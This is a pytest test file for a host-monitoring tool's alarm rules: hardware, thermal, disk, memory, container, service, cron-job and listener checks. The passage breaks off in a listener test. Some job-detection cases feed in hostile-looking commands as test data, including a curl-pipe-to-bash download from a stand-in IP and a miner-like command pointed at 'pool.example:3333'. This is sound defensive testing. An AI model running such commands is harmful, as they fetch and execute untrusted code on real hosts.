"""Hard alarms: for every rule, a trigger, the boundary just below it, and partial data."""

from __future__ import annotations

import dataclasses
import shlex
from typing import Any

import pytest

from neonwatch import rules
from neonwatch.config import Cadence, Config
from neonwatch.rules import Alarm, Snapshot, evaluate
from neonwatch.schema import Finding, Heartbeat, Severity

NOW = 100_000.0
CONFIG = Config()


def beat(confined: bool = True, writable: tuple[str, ...] = ()) -> Heartbeat:
    return Heartbeat(cpu_fraction=0.001, confined=confined, writable=writable,
                     ran=10, failed=0, deferred=0)


def snap(latest: dict[str, dict] | None = None, previous: dict[str, dict] | None = None, *,
         now: float = NOW, heartbeats: Any = None, cadence: dict[str, float] | None = None,
         at: float | None = None, jobs: Any = (), services: Any = (),
         previous_services: Any = ()) -> Snapshot:
    """A snapshot whose observations were all taken at `at` (default: now)."""
    at = now if at is None else at
    return Snapshot(
        now=now,
        latest={k: (at, v) for k, v in (latest or {}).items()},
        previous={k: (at - 60, v) for k, v in (previous or {}).items()},
        heartbeats=((now - 1, beat()),) if heartbeats is None else heartbeats,
        cadence=cadence or {},
        jobs=tuple(jobs), services=tuple(services), previous_services=tuple(previous_services),
    )


def found(snapshot: Snapshot, rule: str, config: Config = CONFIG) -> list[Finding]:
    return [f for f in evaluate(snapshot, config) if f.rule == rule]


def only(snapshot: Snapshot, rule: str) -> Finding:
    hits = found(snapshot, rule)
    assert len(hits) == 1, hits
    return hits[0]


# --- the dispatcher ---------------------------------------------------------------------------


def test_a_healthy_snapshot_raises_nothing():
    assert evaluate(snap(), CONFIG) == ()


def test_every_finding_is_a_schema_finding_with_the_table_key_as_its_rule():
    s = snap({"disk.fill": {"filesystems": [{"mount": "/", "used_pct": 99.0}]},
              "kernel.tainted": {"value": 1}}, {"kernel.tainted": {"value": 0}})
    out = evaluate(s, CONFIG)
    assert {f.rule for f in out} == {"disk.fill", "kernel.taint_changed"}
    assert all(isinstance(f, Finding) and f.rule in rules.RULES for f in out)


def test_a_rule_registers_without_editing_evaluate(monkeypatch):
    def always(snapshot: Snapshot, config: Config):
        yield Alarm(Severity.INFO, "planted", "test:planted", {"now": snapshot.now}, "uptime")

    monkeypatch.setitem(rules.RULES, "test.planted", always)
    assert only(snap(), "test.planted") == Finding(
        "test.planted", Severity.INFO, "planted", "test:planted", {"now": NOW}, "uptime")


def test_a_rule_that_raises_is_reported_and_does_not_silence_the_others(monkeypatch):
    def broken(snapshot: Snapshot, config: Config):
        raise KeyError("boom")

    monkeypatch.setitem(rules.RULES, "test.broken", broken)
    s = snap({"disk.fill": {"filesystems": [{"mount": "/", "used_pct": 99.0}]}})
    out = evaluate(s, CONFIG)
    error = [f for f in out if f.rule == "rules.error"]
    assert len(error) == 1
    assert error[0].severity is Severity.WATCH
    assert error[0].entity == "rule:test.broken"
    assert "boom" in error[0].evidence["error"]
    assert any(f.rule == "disk.fill" for f in out)


def test_rules_ignore_data_of_the_wrong_shape():
    garbage: dict[str, Any] = {
        "edac": {"controllers": "nope"}, "smart.sda": [], "sensors": {"readings": [1, None]},
        "gpu": {"gpus": [{"index": "0", "temperature_c": "hot"}]},
        "disk.fill": {"filesystems": [{"mount": 5, "used_pct": 99.0}, {"used_pct": True}]},
        "vmstat": {"oom_kill": "9"}, "psi.memory": None, "containers": {"containers": [{}]},
        "units.failed": {"units": [{"unit": ""}]}, "journal.warnings": {"capped": "yes"},
        "listeners": {"listeners": [None]}, "kernel.tainted": {"value": 1.5},
        "reboot.required": {"required": 1},
    }
    prev = {"vmstat": {"oom_kill": 1}, "kernel.tainted": {"value": 0}, "gpu": {"gpus": "x"},
            "listeners": {"listeners": []}, "edac": {}, "smart.sda": {"media_errors": 0}}
    jobs = [None, {"id": 5, "command": "/tmp/x"}, {"id": "cron:a", "command": 7},
            {"id": "timer:a.timer", "source": "timer", "result": 3},
            {"id": "", "source": "timer", "result": "failed", "command": "/tmp/x"}]
    services = [None, {"name": "a.service", "restarts": "9"}, {"name": 4, "restarts": 9},
                {"name": "b.service", "restarts": True}]
    before = [None, {"name": "a.service", "restarts": 0}, {"name": "b.service", "restarts": 0}]
    assert evaluate(snap(garbage, prev, jobs=jobs, services=services,
                         previous_services=before), CONFIG) == ()


# --- EDAC -------------------------------------------------------------------------------------


def edac(**counts: tuple[int, int]) -> dict:
    return {"controllers": [{"mc": mc, "ce_count": ce, "ue_count": ue}
                            for mc, (ce, ue) in counts.items()]}


def test_edac_uncorrected_is_critical_per_controller():
    f = only(snap({"edac": edac(mc0=(0, 0), mc1=(0, 2))}), "edac.uncorrected")
    assert (f.severity, f.entity, f.evidence) == (Severity.CRITICAL, "edac:mc1", {"ue_count": 2})


def test_edac_uncorrected_zero_or_missing_is_nothing():
    assert found(snap({"edac": edac(mc0=(3, 0))}), "edac.uncorrected") == []
    assert found(snap({"edac": {"controllers": []}}), "edac.uncorrected") == []
    assert found(snap({"edac": {"controllers": [{"mc": "mc0"}]}}), "edac.uncorrected") == []
    assert found(snap(), "edac.uncorrected") == []


def test_edac_corrected_increase_warns():
    f = only(snap({"edac": edac(mc0=(5, 0))}, {"edac": edac(mc0=(3, 0))}), "edac.corrected")
    assert f.severity is Severity.WARN
    assert (f.entity, f.evidence) == ("edac:mc0", {"ce_count": 5, "previous": 3, "increase": 2})


def test_edac_corrected_standing_or_reset_or_unmatched_is_nothing():
    assert found(snap({"edac": edac(mc0=(3, 0))}, {"edac": edac(mc0=(3, 0))}),
                 "edac.corrected") == []
    assert found(snap({"edac": edac(mc0=(0, 0))}, {"edac": edac(mc0=(3, 0))}),
                 "edac.corrected") == []
    assert found(snap({"edac": edac(mc1=(9, 0))}, {"edac": edac(mc0=(0, 0))}),
                 "edac.corrected") == []
    assert found(snap({"edac": edac(mc0=(9, 0))}), "edac.corrected") == []


# --- SMART ------------------------------------------------------------------------------------


def nvme(**over: Any) -> dict:
    base = {"device": "/dev/nvme0n1", "serial": "S1", "passed": True, "critical_warning": 0,
            "percentage_used": 3, "media_errors": 0, "error_log_entries": 0,
            "reallocated_sectors": None, "pending_sectors": None,
            "offline_uncorrectable": None, "reported_uncorrect": None}
    return base | over


def test_smart_critical_warning_nonzero_is_critical():
    f = only(snap({"smart.nvme0n1": nvme(critical_warning=4)}), "smart.critical_warning")
    assert (f.severity, f.entity) == (Severity.CRITICAL, "disk:/dev/nvme0n1")
    assert f.evidence == {"critical_warning": 4}


def test_smart_critical_warning_zero_or_null_is_nothing():
    assert found(snap({"smart.nvme0n1": nvme()}), "smart.critical_warning") == []
    assert found(snap({"smart.sda": nvme(critical_warning=None)}), "smart.critical_warning") == []
    assert found(snap({"smart.sda": {}}), "smart.critical_warning") == []


def test_smart_health_failed_is_critical():
    f = only(snap({"smart.sda": nvme(passed=False)}), "smart.health_failed")
    assert (f.severity, f.entity) == (Severity.CRITICAL, "disk:/dev/sda")
    assert found(snap({"smart.sda": nvme(passed=None)}), "smart.health_failed") == []
    assert found(snap({"smart.sda": nvme()}), "smart.health_failed") == []


@pytest.mark.parametrize("counter", ["media_errors", "reallocated_sectors", "pending_sectors",
                                     "offline_uncorrectable", "reported_uncorrect"])
def test_smart_media_error_counters_increasing_is_critical(counter):
    f = only(snap({"smart.sda": nvme(**{counter: 3})}, {"smart.sda": nvme(**{counter: 1})}),
             "smart.media_errors")
    assert f.severity is Severity.CRITICAL
    assert f.evidence == {"increased": {counter: {"previous": 1, "now": 3}}}


def test_smart_media_errors_standing_or_first_seen_or_other_disk_is_nothing():
    assert found(snap({"smart.sda": nvme(media_errors=7)}, {"smart.sda": nvme(media_errors=7)}),
                 "smart.media_errors") == []
    assert found(snap({"smart.sda": nvme(media_errors=7)}), "smart.media_errors") == []
    swapped = snap({"smart.sda": nvme(media_errors=7, serial="S2")},
                   {"smart.sda": nvme(media_errors=0)})
    assert found(swapped, "smart.media_errors") == []
    nulls = snap({"smart.sda": nvme(media_errors=None)}, {"smart.sda": nvme(media_errors=0)})
    assert found(nulls, "smart.media_errors") == []


def test_smart_error_log_entries_alone_are_not_a_finding():
    s = snap({"smart.nvme0n1": nvme(error_log_entries=4096)},
             {"smart.nvme0n1": nvme(error_log_entries=12)})
    assert evaluate(s, CONFIG) == ()


def test_smart_wear_at_ninety_percent_warns():
    f = only(snap({"smart.nvme0n1": nvme(percentage_used=90)}), "smart.wear")
    assert (f.severity, f.evidence) == (Severity.WARN, {"percentage_used": 90})
    assert found(snap({"smart.nvme0n1": nvme(percentage_used=89)}), "smart.wear") == []
    assert found(snap({"smart.nvme0n1": nvme(percentage_used=None)}), "smart.wear") == []


def test_the_bare_smart_template_id_is_not_a_disk():
    assert evaluate(snap({"smart": nvme(critical_warning=1)}), CONFIG) == ()


# --- thermal ----------------------------------------------------------------------------------


def reading(chip: str, label: str, value: float, crit: float | None = None,
            kind: str = "temp") -> dict:
    return {"chip": chip, "label": label, "kind": kind, "input": value, "crit": crit,
            "max": None, "min": None}


def sensors(*readings: dict) -> dict:
    return {"readings": list(readings), "count": len(readings)}


@pytest.mark.parametrize("chip,label", [("k10temp-pci-00c3", "Tctl"),
                                        ("coretemp-isa-0000", "Package id 0")])
def test_cpu_temperature_at_95_warns(chip, label):
    f = only(snap({"sensors": sensors(reading(chip, label, 95.0))}), "cpu.temperature")
    assert (f.severity, f.entity) == (Severity.WARN, f"cpu:{chip}")
    assert f.evidence == {"label": label, "temperature_c": 95.0, "limit_c": 95.0}


def test_cpu_temperature_below_95_or_other_labels_is_nothing():
    s = snap({"sensors": sensors(reading("k10temp-pci-00c3", "Tctl", 94.9),
                                 reading("k10temp-pci-00c3", "Tccd1", 99.0),
                                 reading("k10temp-pci-00c3", "Tctl", 99.0, kind="fan"))})
    assert found(s, "cpu.temperature") == []
    assert found(snap({"sensors": {}}), "cpu.temperature") == []


def test_drive_temperature_over_its_own_critical_threshold_warns():
    s = snap({"sensors": sensors(reading("nvme-pci-0600", "Composite", 80.0, crit=79.85))})
    f = only(s, "drive.temperature")
    assert (f.severity, f.entity) == (Severity.WARN, "sensor:nvme-pci-0600/Composite")
    assert f.evidence == {"temperature_c": 80.0, "critical_c": 79.85}


def test_drive_temperature_below_crit_or_without_a_usable_crit_is_nothing():
    s = snap({"sensors": sensors(
        reading("nvme-pci-0600", "Composite", 79.8, crit=79.85),
        reading("nvme-pci-0500", "Sensor 1", 70.0, crit=None),
        reading("nvme-pci-0500", "Sensor 2", 70.0, crit=65261.85),  # sentinel
        reading("nvme-pci-0500", "Sensor 3", 70.0, crit=-273.15),   # sentinel
        reading("k10temp-pci-00c3", "Tctl", 80.0, crit=70.0),       # not a drive
    )})
    assert found(s, "drive.temperature") == []


def test_drivetemp_chips_count_as_drives():
    s = snap({"sensors": sensors(reading("drivetemp-scsi-0-0", "temp1", 70.0, crit=65.0))})
    assert only(s, "drive.temperature").entity == "sensor:drivetemp-scsi-0-0/temp1"


def gpu(index: int = 0, **over: Any) -> dict:
    return {"index": index, "name": "RTX", "temperature_c": 50, "throttle": ["gpu_idle"],
            "pcie_width": 16, "pcie_width_max": 16} | over


def test_gpu_temperature_at_90_warns():
    f = only(snap({"gpu": {"gpus": [gpu(1, temperature_c=90)]}}), "gpu.temperature")
    assert (f.severity, f.entity, f.evidence) == (
        Severity.WARN, "gpu:1", {"temperature_c": 90, "limit_c": 90})
    assert found(snap({"gpu": {"gpus": [gpu(temperature_c=89)]}}), "gpu.temperature") == []
    assert found(snap({"gpu": {"gpus": [gpu(temperature_c=None)]}}), "gpu.temperature") == []


@pytest.mark.parametrize("reason", ["sw_thermal_slowdown", "hw_thermal_slowdown",
                                    "hw_power_brake_slowdown"])
def test_gpu_thermal_or_power_brake_throttle_warns(reason):
    f = only(snap({"gpu": {"gpus": [gpu(throttle=["gpu_idle", reason])]}}), "gpu.throttle")
    assert (f.severity, f.entity, f.evidence) == (Severity.WARN, "gpu:0", {"reasons": [reason]})


def test_gpu_benign_throttle_reasons_are_nothing():
    benign = ["gpu_idle", "sw_power_cap", "applications_clocks_setting", "sync_boost"]
    assert found(snap({"gpu": {"gpus": [gpu(throttle=benign)]}}), "gpu.throttle") == []
    assert found(snap({"gpu": {"gpus": [gpu(throttle=None)]}}), "gpu.throttle") == []


def test_gpu_pcie_width_below_its_previous_width_warns():
    f = only(snap({"gpu": {"gpus": [gpu(1, pcie_width=8)]}},
                  {"gpu": {"gpus": [gpu(1, pcie_width=16)]}}), "gpu.pcie_degraded")
    assert (f.severity, f.entity, f.evidence) == (
        Severity.WARN, "gpu:1", {"pcie_width": 8, "previous": 16, "pcie_width_max": 16})


def test_gpu_pcie_at_x4_by_design_is_not_compared_against_the_maximum():
    # A GPU in a chipset slot can run at x4 of x16 by design.
    by_design = gpu(0, pcie_width=4, pcie_width_max=16)
    assert found(snap({"gpu": {"gpus": [by_design]}}, {"gpu": {"gpus": [by_design]}}),
                 "gpu.pcie_degraded") == []
    assert found(snap({"gpu": {"gpus": [by_design]}}), "gpu.pcie_degraded") == []


def test_gpu_pcie_widening_or_unmatched_or_null_is_nothing():
    cases = [
        (gpu(pcie_width=16), gpu(pcie_width=8)),
        (gpu(1, pcie_width=4), gpu(0, pcie_width=16)),
        (gpu(pcie_width=4, name="Other"), gpu(pcie_width=16)),
        (gpu(pcie_width=None), gpu(pcie_width=16)),
    ]
    for now_, before in cases:
        s = snap({"gpu": {"gpus": [now_]}}, {"gpu": {"gpus": [before]}})
        assert found(s, "gpu.pcie_degraded") == [], (now_, before)


# --- disk fill --------------------------------------------------------------------------------


def fill(*mounts: tuple[str, float | None]) -> dict:
    return {"filesystems": [{"mount": m, "source": "/dev/x", "fstype": "ext4", "used_pct": p}
                            for m, p in mounts]}


def test_disk_fill_warns_at_90_and_is_critical_at_97_per_mount():
    out = found(snap({"disk.fill": fill(("/", 90.0), ("/home", 97.0), ("/var", 89.99),
                                        ("/boot", 96.99), ("/empty", None))}), "disk.fill")
    assert [(f.entity, f.severity) for f in out] == [
        ("mount:/", Severity.WARN), ("mount:/home", Severity.CRITICAL),
        ("mount:/boot", Severity.WARN)]
    assert out[1].evidence == {"used_pct": 97.0, "source": "/dev/x", "fstype": "ext4",
                               "warn_pct": 90, "critical_pct": 97}


def test_disk_fill_missing_is_nothing():
    assert found(snap({"disk.fill": {}}), "disk.fill") == []


# --- memory -----------------------------------------------------------------------------------


def test_oom_kill_increase_warns():
    f = only(snap({"vmstat": {"oom_kill": 4}}, {"vmstat": {"oom_kill": 1}}), "memory.oom_kill")
    assert (f.severity, f.entity, f.evidence) == (
        Severity.WARN, "memory:oom", {"oom_kill": 4, "previous": 1, "killed": 3})


def test_oom_kill_standing_or_reset_or_first_seen_is_nothing():
    assert found(snap({"vmstat": {"oom_kill": 4}}, {"vmstat": {"oom_kill": 4}}),
                 "memory.oom_kill") == []
    assert found(snap({"vmstat": {"oom_kill": 0}}, {"vmstat": {"oom_kill": 4}}),
                 "memory.oom_kill") == []
    assert found(snap({"vmstat": {"oom_kill": 4}}), "memory.oom_kill") == []


def test_memory_full_pressure_at_10_warns():
    f = only(snap({"psi.memory": {"full_avg60": 10.0}}), "memory.pressure")
    assert (f.severity, f.entity, f.evidence) == (
        Severity.WARN, "memory:pressure", {"full_avg60": 10.0, "limit": 10})
    assert found(snap({"psi.memory": {"full_avg60": 9.99}}), "memory.pressure") == []
    assert found(snap({"psi.memory": {"full_avg60": None}}), "memory.pressure") == []


# --- containers, units, journal ---------------------------------------------------------------


def test_restarting_container_is_a_crash_loop():
    s = snap({"containers": {"containers": [
        {"name": "shopfront-worker-1", "state": "restarting", "image": "dw:1",
         "status": "Restarting (1) 57 seconds ago", "exit_code": 1},
        {"name": "db", "state": "running", "image": "pg", "status": "Up", "exit_code": None},
        {"name": "old", "state": "exited", "image": "x", "status": "Exited (1)", "exit_code": 1},
    ]}})
    f = only(s, "container.crash_loop")
    assert (f.severity, f.entity) == (Severity.WARN, "container:shopfront-worker-1")
    assert "crash loop" in f.title
    assert f.evidence == {"state": "restarting", "status": "Restarting (1) 57 seconds ago",
                          "exit_code": 1, "image": "dw:1"}
    assert found(snap({"containers": {}}), "container.crash_loop") == []


def container(status: str, state: str = "running", id: str = "a1b2c3d4e5f6",
              name: str = "shopfront-worker-1") -> dict:
    return {"id": id, "name": name, "state": state, "image": "dw:1", "status": status,
            "exit_code": None}


def containers(*items: dict) -> dict:
    return {"containers": {"containers": list(items)}}


def test_a_container_sampled_just_up_twice_running_is_a_crash_loop():
    # Seen live: shopfront-worker-1 restarting about once a second, sampled as running.
    s = snap(containers(container("Up 1 second")), containers(container("Up Less than a second")))
    f = only(s, "container.crash_loop")
    assert (f.severity, f.entity) == (Severity.WARN, "container:shopfront-worker-1")
    assert f.evidence == {"state": "running", "status": "Up 1 second",
                          "previous_status": "Up Less than a second", "interval_s": 60,
                          "exit_code": None, "image": "dw:1"}
    assert f.next_step == ("docker logs --tail 100 shopfront-worker-1; "
                           "docker inspect shopfront-worker-1")


def test_restarting_then_just_up_is_a_crash_loop():
    s = snap(containers(container("Up 3 seconds (health: starting)")),
             containers(container("Restarting (1) 2 seconds ago", "restarting")))
    assert only(s, "container.crash_loop").evidence["previous_status"] == (
        "Restarting (1) 2 seconds ago")


@pytest.mark.parametrize(("now", "before"), [
    (container("Up 1 second"), None),                                   # a first observation
    (container("Up 1 second"), container("Up 5 minutes")),              # one start, not a loop
    (container("Up 2 minutes"), container("Up 1 second")),              # it stayed up
    (container("Up About a minute"), container("Up 1 second")),
    (container("Up 1 second"), container("Up 1 second", id="0f0f0f0f0f0f")),  # recreated
    (container("Up 1 second"), container("Exited (1) 3 seconds ago", "exited")),
    (container("Exited (1) 1 second ago", "exited"), container("Up 1 second")),
    (container("Up 1 second", name=""), container("Up 1 second", name="")),
    (container("Up 1 second", id=""), container("Up 1 second", id="")),
])
def test_one_fresh_start_or_a_container_that_stays_up_is_no_crash_loop(now, before):
    s = snap(containers(now), containers(before) if before else None)
    assert found(s, "container.crash_loop") == []


def test_one_start_seen_twice_is_no_crash_loop():
    # 30 s apart, up 15 s and then 45 s: the same start, sampled twice.
    s = snap(containers(container("Up 45 seconds")))
    s = dataclasses.replace(s, previous={
        "containers": (NOW - 30, containers(container("Up 15 seconds"))["containers"])})
    assert found(s, "container.crash_loop") == []


@pytest.mark.parametrize("value", [0, 2, -1])
def test_hardlinks_not_protected_warns(value):
    f = only(snap({"fs.protected_hardlinks": {"value": value, "protected": False}}),
             "security.hardlinks_unprotected")
    assert (f.severity, f.entity) == (Severity.WARN, "sysctl:fs.protected_hardlinks")
    assert f.evidence == {"value": value} and str(value) in f.title


@pytest.mark.parametrize("data", [{"value": 1, "protected": True}, {}, {"value": "0"},
                                  {"value": True}, {"value": None}])
def test_protected_or_unknown_hardlinks_are_nothing(data):
    # Unknown is not evidence here: a probe that stops answering is probe.stale's to raise.
    assert found(snap({"fs.protected_hardlinks": data}), "security.hardlinks_unprotected") == []
    assert found(snap(), "security.hardlinks_unprotected") == []


def test_each_failed_unit_warns():
    s = snap({"units.failed": {"units": [
        {"unit": "a.service", "load": "loaded", "active": "failed", "sub": "failed",
         "description": "A"},
        {"unit": "b.mount", "load": "loaded", "active": "failed", "sub": "failed",
         "description": "B"}]}})
    out = found(s, "unit.failed")
    assert [(f.entity, f.severity) for f in out] == [("unit:a.service", Severity.WARN),
                                                     ("unit:b.mount", Severity.WARN)]
    assert out[0].evidence == {"load": "loaded", "active": "failed", "sub": "failed",
                               "description": "A"}
    assert found(snap({"units.failed": {"units": []}}), "unit.failed") == []
    assert found(snap({"units.failed": {}}), "unit.failed") == []


def journal(count: int, capped: bool, by_unit: dict[str, int]) -> dict:
    return {"count": count, "capped": capped, "by_unit": by_unit}


def test_one_unit_saturating_a_capped_journal_is_a_log_flood():
    f = only(snap({"journal.warnings": journal(500, True, {"openvpn.service": 400,
                                                           "kernel": 100})}), "journal.flood")
    assert (f.severity, f.entity) == (Severity.WATCH, "unit:openvpn.service")
    assert "log flood" in f.title
    assert f.evidence == {"lines": 400, "of": 500, "share": 0.8, "capped": True}


def test_a_flooding_identifier_that_is_not_a_unit_is_named_as_a_log_source():
    f = only(snap({"journal.warnings": journal(500, True, {"kernel": 500})}), "journal.flood")
    assert f.entity == "log:kernel"


def test_journal_below_80_percent_or_uncapped_or_empty_is_nothing():
    assert found(snap({"journal.warnings": journal(500, True, {"a.service": 399,
                                                               "b": 101})}),
                 "journal.flood") == []
    assert found(snap({"journal.warnings": journal(499, False, {"a.service": 499})}),
                 "journal.flood") == []
    assert found(snap({"journal.warnings": journal(0, True, {})}), "journal.flood") == []
    assert found(snap({"journal.warnings": {"capped": True}}), "journal.flood") == []
    assert found(snap({"journal.warnings": journal(500, True, {"a.service": "500"})}),
                 "journal.flood") == []


def test_journal_errors_are_left_to_judgement():
    assert evaluate(snap({"journal.errors": journal(500, True, {"a.service": 500})}),
                    CONFIG) == ()


# --- scheduled jobs and services: records `neonwatch.jobs` joined, carried on the snapshot -----


def job(id: str = "cron:3fa2b1c4d5e6", *, source: str = "cron", user: str = "alice",
        command: str = "/usr/bin/rsync -a ~/src /mnt/backup",
        file: str = "/var/spool/cron/crontabs/alice", schedule: str = "*/5 * * * *",
        unit: str | None = None, result: str | None = None, **extra: Any) -> dict:
    """A job record as `jobs.scheduled` returns it (the PLAN contract)."""
    static = {"source": source, "file": file, "user": user, "schedule": schedule,
              "command": command, "unit": unit}
    return {"id": id, **static, "static": static, "last": NOW - 600, "next": NOW + 600,
            "result": result, **extra}


def timer(name: str = "backup", result: str | None = "success", user: str = "root",
          command: str = "/usr/local/bin/backup --all") -> dict:
    return job(f"timer:{name}.timer", source="timer", user=user, command=command,
               file=f"/etc/systemd/system/{name}.timer", schedule="*-*-* 03:00:00",
               unit=f"{name}.service", result=result)


def service(name: str = "openvpn.service", restarts: Any = 0, **over: Any) -> dict:
    """A service record as `jobs.services` returns it (the PLAN contract)."""
    return {"name": name, "description": "VPN agent", "user": "root",
            "exec": ["/usr/sbin/openvpn --config /etc/openvpn/client.conf"], "active": "activating",
            "sub": "auto-restart", "result": "exit-code", "restarts": restarts,
            "main_status": 1, "started": NOW - 5, "exited": NOW - 2, "enabled": "enabled",
            "file": f"/usr/lib/systemd/system/{name}", **over}


def loop(restarts: int, before: int | None) -> Snapshot:
    return snap(services=[service(restarts=restarts)],
                previous_services=[] if before is None else [service(restarts=before)])


def test_a_service_restarting_three_times_between_observations_is_a_restart_loop():
    f = only(loop(5, 2), "unit.restart_loop")
    assert (f.severity, f.entity) == (Severity.WARN, "unit:openvpn.service")
    assert f.evidence == {"restarts": 5, "previous": 2, "increase": 3, "active": "activating",
                          "sub": "auto-restart", "result": "exit-code"}
    assert "restart" in f.title and "openvpn.service" in f.title


def test_restarts_just_below_the_loop_limit_or_standing_or_reset_or_unbaselined_are_nothing():
    assert rules.RESTART_LOOP == 3
    for now, before in ((4, 2), (2, 2), (0, 7), (9, None)):
        assert found(loop(now, before), "unit.restart_loop") == [], (now, before)
    other = snap(services=[service(restarts=9)],
                 previous_services=[service("other.service", restarts=0)])
    assert found(other, "unit.restart_loop") == []


@pytest.mark.parametrize("result", ["exit-code", "timeout", "signal", "core-dump",
                                    "start-limit-hit"])
def test_a_timer_whose_service_last_ended_badly_is_watch(result):
    f = only(snap(jobs=[timer(result=result)]), "job.timer_failed")
    assert (f.severity, f.entity) == (Severity.WATCH, "job:timer:backup.timer")
    assert f.evidence == {"unit": "backup.service", "result": result, "last": NOW - 600,
                          "schedule": "*-*-* 03:00:00"}
    assert "backup.service" in f.title and result in f.title


@pytest.mark.parametrize("record", [timer(result="success"), timer(result=None),
                                    timer(result=""), job(result="exit-code")])
def test_a_timer_that_succeeded_or_has_no_result_or_a_cron_job_is_nothing(record):
    assert found(snap(jobs=[record]), "job.timer_failed") == []


@pytest.mark.parametrize("command, path", [
    ("/tmp/x", "/tmp/x"),
    ("sh /tmp/.cache/run.sh --quiet", "/tmp/.cache/run.sh"),
    ("cd / && /dev/shm/m -o pool.example:3333", "/dev/shm/m"),
    ("nice -n 10 /var/tmp/a", "/var/tmp/a"),
    ("FOO=1 BAR=2 /tmp/x", "/tmp/x"),
    ("curl -s http://198.51.100.7/i | bash -c '/tmp/y now'", "/tmp/y"),
    ('/usr/bin/true; "/tmp/q" > /dev/null 2>&1', "/tmp/q"),
    ("/tmp/x 'unbalanced", "/tmp/x"),
    # A shell's -c word is a command line of its own.
    ("bash -c 'sleep 0; /tmp/evil'", "/tmp/evil"),
    ("/bin/sh -ec 'cd / && /dev/shm/m -o pool.example:3333'", "/dev/shm/m"),
    ('/usr/bin/bash -lc "echo hi | /var/tmp/a"', "/var/tmp/a"),
    ("sh -c \"bash -c 'true; /tmp/deep'\"", "/tmp/deep"),
    ("bash -c 'true'; /tmp/after", "/tmp/after"),
])
def test_a_job_that_runs_a_program_from_a_tmp_directory_warns(command, path):
    f = only(snap(jobs=[job(command=command)]), "job.runs_from_tmp")
    assert (f.severity, f.entity) == (Severity.WARN, "job:cron:3fa2b1c4d5e6")
    assert f.evidence == {"path": path, "user": "alice", "source": "cron",
                          "file": "/var/spool/cron/crontabs/alice", "schedule": "*/5 * * * *",
                          "command": command}
    assert path in f.title


def test_a_root_job_running_from_a_tmp_directory_is_critical():
    f = only(snap(jobs=[timer(command="/tmp/.x/payload")]), "job.runs_from_tmp")
    assert (f.severity, f.entity) == (Severity.CRITICAL, "job:timer:backup.timer")


@pytest.mark.parametrize("command", [
    "find /tmp -mtime +7 -delete",                 # names /tmp, runs find
    "/usr/bin/foo > /tmp/out.log 2>&1",            # a redirect target is not run
    "/usr/bin/foo --dir /tmp/cache",               # an argument is not run
    "/usr/sbin/tmpreaper 7d /tmp",
    "/tmpfoo/x", "/home/alice/tmp/x", "",
    "bash -c 'date > /tmp/out.log'",               # inside -c: still a redirect target
    "sh -c 'find /tmp -mtime +7 -delete'",
    "bash -x '/usr/bin/foo; /tmp/x'",               # no -c: a script file name, not a line
    "python3 -c 'import os; /tmp/x'",               # Python, not a shell command line
    "bash -c 'true' /tmp/x",                        # $0 for the -c line, not run
])
def test_a_job_that_only_mentions_a_tmp_directory_is_nothing(command):
    assert found(snap(jobs=[job(command=command)]), "job.runs_from_tmp") == []


def nested(shells: int) -> str:
    command = "/tmp/x"
    for _ in range(shells):
        command = f"sh -c {shlex.quote('true; ' + command)}"
    return command


def test_command_lines_are_read_to_the_depth_and_no_further():
    assert only(snap(jobs=[job(command=nested(rules.SCRIPT_DEPTH))]),
                "job.runs_from_tmp").evidence["path"] == "/tmp/x"
    assert found(snap(jobs=[job(command=nested(rules.SCRIPT_DEPTH + 1))]),
                 "job.runs_from_tmp") == []


def tmp_jobs(n: int, file: str = "/var/spool/cron/crontabs/mallory", user: str = "mallory"
             ) -> list[dict]:
    return [job(f"cron:{i:012x}", file=file, user=user, command=f"/tmp/x{i}") for i in range(n)]


def test_job_findings_are_capped_per_file_with_one_summary_for_the_rest():
    assert rules.JOB_FINDINGS_PER_FILE == 5
    spool = "/var/spool/cron/crontabs/mallory"
    other = tmp_jobs(2, "/var/spool/cron/crontabs/bob", "bob")
    out = found(snap(jobs=[*reversed(tmp_jobs(8)), *other]), "job.runs_from_tmp")
    mallory = [f for f in out if f.evidence.get("file") == spool]
    assert [f.entity for f in mallory[:5]] == [f"job:cron:{i:012x}" for i in range(5)]
    summary = mallory[5]
    assert len(mallory) == 6 and (summary.severity, summary.entity) == (
        Severity.WARN, f"file:{spool}")
    assert "8" in summary.title and spool in summary.title
    assert summary.evidence == {"file": spool, "matched": 8, "shown": 5,
                                "not_shown": [f"job:cron:{i:012x}" for i in (5, 6, 7)]}
    assert summary.next_step == f"sudo cat {spool}"
    assert len([f for f in out if f.evidence.get("file") != spool]) == 2   # bob: uncapped


def test_exactly_the_cap_has_no_summary_and_one_more_does():
    assert len(found(snap(jobs=tmp_jobs(5)), "job.runs_from_tmp")) == 5
    out = found(snap(jobs=tmp_jobs(6)), "job.runs_from_tmp")
    assert len(out) == 6 and out[-1].entity.startswith("file:")


def test_the_summary_takes_the_most_severe_of_the_jobs_it_stands_for():
    root = tmp_jobs(7, "/etc/cron.d/x", "alice")
    root[6] = {**root[6], "user": "root"}
    summary = found(snap(jobs=root), "job.runs_from_tmp")[-1]
    assert (summary.entity, summary.severity) == ("file:/etc/cron.d/x", Severity.CRITICAL)


def test_a_crontab_holding_more_entries_than_are_read_warns_once_per_file():
    spool = "/var/spool/cron/crontabs/mallory"
    flooded = [job("cron:a", file=spool, overflow=3), job("cron:b", file=spool, overflow=3)]
    f = only(snap(jobs=flooded), "job.crontab_flood")
    assert (f.severity, f.entity) == (Severity.WARN, f"file:{spool}")
    assert f.evidence == {"file": spool, "overflow": 3}
    assert "3" in f.title and f.next_step == f"sudo wc -l {spool}"


@pytest.mark.parametrize("extra", [{}, {"overflow": 0}, {"overflow": "9"}, {"overflow": True}])
def test_no_overflow_is_no_flood(extra):
    assert found(snap(jobs=[job(**extra)]), "job.crontab_flood") == []


def test_a_long_command_is_bounded_in_the_evidence():
    command = "/tmp/x " + "a" * 1000
    f = only(snap(jobs=[job(command=command)]), "job.runs_from_tmp")
    assert f.evidence["command"] == command[:rules.COMMAND_CHARS]


# --- listeners --------------------------------------------------------------------------------


def sock(proto: str, address: str, port: int, process: str = "", wildcard: bool | None = None,
         ) -> dict:
    wild = address in ("0.0.0.0", "::", "*", "::ffff:0.0.0.0") if wildcard is None else wildcard
    return {"proto": proto, "state": "LISTEN" if proto == "tcp" else "UNCONN",
            "address": address, "port": port, "process": process, "pid": None,
            "interface": "", "wildcard": wild, "loopback": address.startswith("127.")}


def listening(*socks: dict) -> dict:
    return {"listeners": list(socks)}


def test_a_new_wildcard_tcp_listener_warns_once_per_proto_and_port():
    before = listening(sock("tcp", "0.0.0.0", 22), sock("tcp", "127.0.0.1", 8000))
